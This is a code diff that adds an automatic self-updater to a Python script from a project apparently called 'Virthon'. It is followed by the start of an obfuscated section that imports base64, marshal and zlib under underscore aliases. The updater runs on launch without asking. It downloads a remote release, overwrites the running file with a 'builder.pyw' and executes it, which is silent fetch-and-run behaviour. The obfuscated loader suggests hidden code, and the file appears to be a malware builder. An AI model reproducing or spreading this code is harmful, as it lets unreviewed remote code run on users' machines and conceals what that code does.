@@ -1,3 +1,65 @@
+import os 
+import requests
+import zipfile
+import glob
+import io
+import sys
+import asyncio
+current_file = __file__
+absolute_path = os.path.abspath(current_file)
+directory = os.path.dirname(absolute_path)
+username = os.getlogin()
+user = rf"c:\Users\{username}"
+username = os.getlogin()
+nom_dossier = fr"{user}\Virthon"
+source_directory = rf"{user}\Downloads\stelows-Virthon-*"
+destination_file2 = absolute_path
+destination_file = directory
+repository_owner = "stelows"
+repository_name = "Virthon"
+version = "0.0.0"
+async def update():
+    async def get_latest_release_info():
+        url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/releases/latest"
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            return data["tag_name"], data["zipball_url"]
+    async def check_for_updates():
+        current_version = version
+        latest_version, download_url = await get_latest_release_info()
+        if current_version == latest_version:
+            pass
+        else:
+            await download_and_extract_latest_release(download_url)
+
+    async def download_and_extract_latest_release(download_url):
+        response = requests.get(download_url)
+        if response.status_code == 200:
+            zip_data = io.BytesIO(response.content)
+            with zipfile.ZipFile(zip_data, 'r') as zip_ref:
+                zip_ref.extractall(rf"{user}\Downloads")
+            python_files = glob.glob(os.path.join(source_directory, "builder.pyw"))
+            if python_files:
+                source_file = python_files[0]
+                clone_file(source_file, destination_file2)
+                os.remove(source_file)
+                os.startfile(destination_file2)
+            else:
+                pass
+        else:
+            pass
+        sys.exit()
+    def clone_file(source, destination):
+        with open(source, 'rb') as source_file:
+            contenu = source_file.read()
+        with open(destination, 'wb') as destination_file:
+            destination_file.write(contenu)
+
+    await check_for_updates()
+
+asyncio.run(update())
+
 import base64 as __
 import marshal as ____
 import zlib as _______
